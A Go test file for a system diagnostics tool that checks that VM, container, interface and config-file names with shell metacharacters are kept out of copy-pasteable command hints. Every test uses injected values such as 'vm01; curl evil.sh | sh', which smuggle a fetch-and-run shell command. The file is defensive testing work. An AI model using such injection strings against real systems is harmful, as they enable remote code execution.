package analysis

import (
	"strings"
	"testing"

	"github.com/keyorixhq/dashdiag/internal/models"
)

// TestCheckKVMVMsXMLDeep_NameOmitsShellMetachars is the sibling of
// TestCheckKVMVMs_CrashedNameOmitsShellMetachars (internal-analysis-12-02):
// checkKVMVMs' crashed-VM hints validate vm.Name via looksLikeSafeToken, but
// checkKVMVMsXMLDeep — the --deep per-VM XML checks, one function away in the
// same file — spliced it unescaped into "to inspect: virsh …" hints with no
// guard at all.
func TestCheckKVMVMsXMLDeep_NameOmitsShellMetachars(t *testing.T) {
	t.Parallel()
	unsafe := "vm01; curl evil.sh | sh"
	got := checkKVMVMsXMLDeep(models.KVMInfo{
		VMs: []models.KVMVM{{
			Name:            unsafe,
			MissingDiskPath: "/var/lib/libvirt/images/vm01.qcow2",
			EmulatedNICs:    []string{"e1000"},
			EmulatedDisks:   []string{"ide0"},
		}},
	})
	if len(got) != 3 {
		t.Fatalf("expected 3 insights (missing disk, emulated NIC, emulated disk), got %d", len(got))
	}
	for _, ins := range got {
		for _, h := range ins.Hints {
			if strings.Contains(h, "curl evil.sh") {
				t.Errorf("XML-deep hint must not embed the raw shell-metacharacter VM name verbatim (copy-paste RCE risk): %q", h)
			}
		}
	}
}

// TestCheckDockerContainers_NameOmitsShellMetachars is the sibling of the KVM
// VM name guard (internal-analysis-12-03): checkDockerContainers spliced
// container names unescaped into "to inspect: docker …" hints with no guard
// at all, despite the same looksLikeSafeToken guard existing one function
// away in this file for KVM VM names.
func TestCheckDockerContainers_NameOmitsShellMetachars(t *testing.T) {
	t.Parallel()
	unsafe := "web; curl evil.sh | sh"
	got := checkDockerContainers(models.DockerInfo{
		CrashLooping: []string{unsafe},
		Unhealthy:    []string{unsafe},
	})
	if len(got) != 2 {
		t.Fatalf("expected 2 insights (crash-looping, unhealthy), got %d", len(got))
	}
	for _, ins := range got {
		for _, h := range ins.Hints {
			if strings.Contains(h, "curl evil.sh") {
				t.Errorf("docker hint must not embed the raw shell-metacharacter container name verbatim (copy-paste RCE risk): %q", h)
			}
		}
	}
}

// TestCheckNetwork_PrimaryInterfaceNameOmitsShellMetachars covers cmd-04-05:
// net.PrimaryInterface used to be spliced unescaped into a copy-pasteable
// "to fix: ip link set … up" hint.
func TestCheckNetwork_PrimaryInterfaceNameOmitsShellMetachars(t *testing.T) {
	t.Parallel()
	unsafe := "eth0; curl evil.sh | sh"
	got := checkNetwork(models.NetworkInfo{
		PrimaryInterface:     unsafe,
		PrimaryInterfaceDown: true,
	})
	found := false
	for _, ins := range got {
		for _, h := range ins.Hints {
			if strings.Contains(h, "curl evil.sh") {
				t.Errorf("network hint must not embed the raw shell-metacharacter interface name verbatim (copy-paste RCE risk): %q", h)
			}
			if strings.Contains(h, "to fix:") && strings.Contains(h, "withheld") {
				found = true
			}
		}
	}
	if !found {
		t.Error("expected a withheld 'to fix' hint for the down primary interface with an unsafe name")
	}
}

// TestCheckNetwork_NICErrorInterfaceNameOmitsShellMetachars covers an
// untagged sibling of cmd-04-05 found sweeping this file: iface.Name spliced
// unescaped into "to inspect: ethtool -S …"/"ip -s link show …" hints, one
// function above the guarded PrimaryInterfaceDown case.
func TestCheckNetwork_NICErrorInterfaceNameOmitsShellMetachars(t *testing.T) {
	t.Parallel()
	unsafe := "eth0; curl evil.sh | sh"
	got := checkNetwork(models.NetworkInfo{
		Interfaces: []models.InterfaceInfo{{
			Name:      unsafe,
			Up:        true,
			RxErrors:  1000,
			RxPackets: 1000,
			TxErrors:  1000,
			TxPackets: 1000,
		}},
	})
	if len(got) == 0 {
		t.Fatal("high NIC error rate must produce a WARN insight, got none")
	}
	for _, ins := range got {
		for _, h := range ins.Hints {
			if strings.Contains(h, "curl evil.sh") {
				t.Errorf("NIC-error hint must not embed the raw shell-metacharacter interface name verbatim (copy-paste RCE risk): %q", h)
			}
		}
	}
}

// TestCheckNetworkdConfig_PathAndNameOmitShellMetachars covers cmd-04-05
// (the chmod hint) and its two untagged siblings in the same file found
// sweeping for the same pattern: FailedLinks/StuckLinks names spliced
// unescaped into "to inspect: networkctl status …" hints.
func TestCheckNetworkdConfig_PathAndNameOmitShellMetachars(t *testing.T) {
	t.Parallel()
	unsafePath := "/etc/systemd/network/10-eth0.network; curl evil.sh | sh"
	unsafeLink := "eth0; curl evil.sh | sh"
	got := checkNetworkdConfig(models.NetworkdConfigInfo{
		Detected: true,
		UnreadableFiles: []models.NetworkdConfigFile{
			{Path: unsafePath, Mode: "0600"},
		},
		FailedLinks: []models.NetworkdLink{
			{Name: unsafeLink, Operational: "failed"},
		},
		StuckLinks: []models.NetworkdLink{
			{Name: unsafeLink, Operational: "configuring"},
		},
	})
	if len(got) != 3 {
		t.Fatalf("expected 3 insights (unreadable file, failed link, stuck link), got %d", len(got))
	}
	for _, ins := range got {
		for _, h := range ins.Hints {
			// Only actual copy-pasteable shell commands ("to fix:"/"to
			// inspect:"/"to reload after a fix:") need the guard — matching
			// the established convention (see checkKVMVMs): a plain
			// informational "affected: <list>" label line is display text,
			// not a command, and is out of scope for this check (it's still
			// control-byte-stripped by output.SanitizeControl at the render
			// choke point, just not shell-metacharacter-validated here).
			isCommandHint := strings.HasPrefix(h, "to fix:") || strings.HasPrefix(h, "to inspect:") || strings.HasPrefix(h, "to reload after a fix:")
			if isCommandHint && strings.Contains(h, "curl evil.sh") {
				t.Errorf("networkd command hint must not embed the raw shell-metacharacter path/link name verbatim (copy-paste RCE risk): %q", h)
			}
		}
	}
}
